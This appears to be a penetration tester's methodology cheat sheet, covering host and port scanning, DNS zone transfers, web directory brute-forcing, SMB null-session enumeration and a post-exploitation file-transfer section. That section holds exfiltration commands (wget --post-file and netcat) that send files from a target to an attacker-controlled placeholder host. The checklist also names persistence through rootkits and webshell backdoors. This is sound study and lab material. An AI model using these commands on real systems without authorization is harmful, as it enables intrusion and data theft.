# Methodology Checklist

Most assessments involve the following things:
- enumeration
	- identifying running services & the purpose of the target
	- re-enumerating services
	- finding software and hardware versions
	- searching for exploits in found versions
	- collecting credentials
- exploitation
- enumeration (again)
- persistence
- privilege escalation
- enumeration (again)
- persistence (again)

Enumeration is recursive. You may do initial enumeration, then re-enumerate what you've found, and this may happen several times before you do any exploitation.

Once you gain a foothold on a target somehow (i.e. remote code execution or remote access) you will have to re-enumerate. You will want to enumerate other users on the target or network, any new services that are only available locally, and any security flaws on the target now you have access to the file system and system information.

You may then wish to do any/all of the following
- escalate to a user of higher privilege
- pivot to another network or host (lateral movement)
- exfiltrate data (passwords, audit logs, user information, database dumps)
- establish persistence on the host (remote access tools, rootkits, webshell backdoors)

# Enumeration

Enumeration is a wide topic, so this section contains a lot of detail on different stages and services.

## Initial Network Enumeration

Use this enumeration to do initial scans of the network - the hosts & services discovered can then be subsequently enumerated.

### Network Host Enumeration

Use these commands to discover hosts on a subnet.

#### Nmap

Scan multiple targets on your subnet (assuming you are aware of a host with the IP address `a.b.c.d`):

```bash
$ nmap -sP -PI a.b.c.0/24
```

See [this Stack Exchange article](https://security.stackexchange.com/questions/36198/how-to-find-live-hosts-on-my-network) for more.

#### arp

Query ARP (Address Resolution Protocol) tables:

```bash
$ arp -a -n
```

#### IP

View your neighbours:

```bash
$ ip neigh
```

This is similar to the `arp -a -n` command, but is a nice alternative. See [this RedHat article](https://access.redhat.com/sites/default/files/attachments/rh_ip_command_cheatsheet_1214_jcs_print.pdf) for more.

### nmap

Use `nmap` to identify open ports on a specific host.

#### Standard Scan

With the `-v` flag to see as it's discovered:

```bash
$ mkdir nmap
$ nmap -sC -sV -v -oA nmap/target [IP/HOST]
```

Using `-Pn` if pings are blocked:

```bash
$ nmap -sC -sV -Pn -v -oA nmap/target [IP/HOST]
```

#### Full Port Scan

Do all 65535 ports:

```bash
$ nmap -p- -oA nmap/target-allports [IP/HOST]
```

Add a `sleep 300; ` to the start of this command to make it wait till your first `nmap` is done so you aren't running two scans at once. It's also worth waiting to see if your first scan requires the `-Pn` flag before running it.

With high speed:

```bash
$ nmap -p- --min-rate=10000 -oA nmap/target-allports [IP/HOST]
```

If you find new ports, rescan them:

```bash
$ nmap -p- --min-rate=10000 -oA nmap/[TARGET]-allports [TARGET]
Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-22 08:20 BST
Nmap scan report for [TARGET]
Host is up (0.036s latency).
Not shown: 62461 filtered ports, 3069 closed ports
PORT      STATE SERVICE
...[old ports skipped out, new ports below]..
22022/tcp open  unknown
40893/tcp open  unknown
52221/tcp open  unknown
$ nmap -sC -sV -p 22022,40893,52221 -oA nmap/[TARGET]-newports [TARGET]
```

Search the version numbers returned against searchsploit if you get anything back.

#### OS Enumeration

Takes guesses at the operating system (requires root privileges):

```bash
$ sudo nmap -O -oA nmap/target-os [IP/HOST]
```

#### UDP

Scans common UDP Ports (requires root privileges):

```bash
$ sudo nmap -sU -oA nmap/target-udp [IP/HOST]
```

#### Vuln Scan

Will identify common vulnerabilities such as Eternal Blue and Heartbleed:

```bash
$ nmap --script vuln -oA nmap/target-vuln [IP/HOST]
```

### DNS Enumeration

#### Dig

Basic DNS lookup:

```bash
$ dig [IP/HOST]
```

Zone transfer (may expose more domains):

```bash
$ dig axfr [IP/HOST]
```

## Automated Web Enumeration

Before running Gobuster, check [[Methodology Checklist#What Powers the Site|what powers the site]]

### Gobuster

#### Standard Scan

```bash
$ mkdir gobuster
$ gobuster dir -u http://[IP/DOMAIN] -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -o gobuster/root
```

Alternative list if running out of ideas:

```bash
$ gobuster dir -u http://[IP/DOMAIN]  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -o gobuster/root
```

With `-k` flag if need to ignore a bad cert:

```bash
$ gobuster dir -k -u https://[IP/DOMAIN] -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -o gobuster/root
```

### For Directories

This will find directories such as `/cgi-bin/` when looking for shellshock:

```bash
$ gobuster dir -f -u https://[IP/DOMAIN] -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -o gobuster/root
```

Then you can run a second scan recursively on the directories you've found.

## Manual Web Enumeration

### Turn on Burp Suite

- Launch Burp
- Add a proxy in browser to `localhost:8080`
- View the traffic as it comes through
- Add rules to not intercept traffic to irrelevant domains (optional)

### View Site Source

Press `Ctrl + U` (on Firefox) to view the source, or right-click and view source.

Look for:
- comments (`<!-- -->`)
- references to files (scripts, images, directories) and their file extensions
- hidden elements (`display: none` etc)
- form elements

### What Powers the Site?

#### Checking Extensions

Try to visit the following:
- `index.html`
- `index.php`
- `index.asp`
- `index.aspx`
- `index.jsp`

Stop as soon as one of them loads

#### Checking Site Headers

Use `curl` to read the `X-Powered-By` header:

```bash
$ curl -v [TARGET]
```

#### Searchsploit

Pass all discovered technologies and version numbers to `searchsploit` - e.g.

```bash
$ searchsploit -u #update
$ searchsploit term1 [term2] ... [termN]
```

Use flags such as `-e` for an exact match, `--exclude="term"` to not match certain terms.

## SMB Enumeration

### smbmap

Basic scan - may expose hostnames:

```bash
$ smbmap -H [HOST] -P [PORT]
```

Enumerate with null authentication:

```bash
$ smbmap -u null -p "" -H 10.10.10.40
```

### smbclient

Connect to a server:

```bash
$ smbclient //[IP]
```

Connect to a specific share:

```bash
$ smbclient //[IP]/[SHARE]
```

Connect with null authentication:

```bash
$ smbclient -N //[IP]/[SHARE]
```

Use the `-L` flag to list shares:

```bash
$ smbclient -L hostname -U username
```

Once connected, use the following commands to enumerate files:
- `dir` to list files and directories
- `cd` to change directory
- `get` to download a file

# Post Exploitation

## File Transfer

### Exfiltration

#### SCP

Host must be running SSH, and you must be authenticated.

On local box:

```bash
$ scp [user@][TARGET]:/path/to/target/file /local/path
```

See more at [[Fundamental Skills#Secure Copy]]

#### wget

Use a `wget` POST request if you have a fileserver that accepts posts. I [have one here](https://gist.github.com/Twigonometry/a619bc5234d39296737e8d00899f23af):

```bash
$ wget --post-file /path/to/file http://[LOCAL_IP]:[PORT]/
```

#### Netcat

On host:

```bash
$ nc -l -p [PORT] > /path/to/outfile
```

On target:

```bash
$ nc -w 3 [HOST_IP] [PORT] < /path/to/file
```

See more at [[netcat]]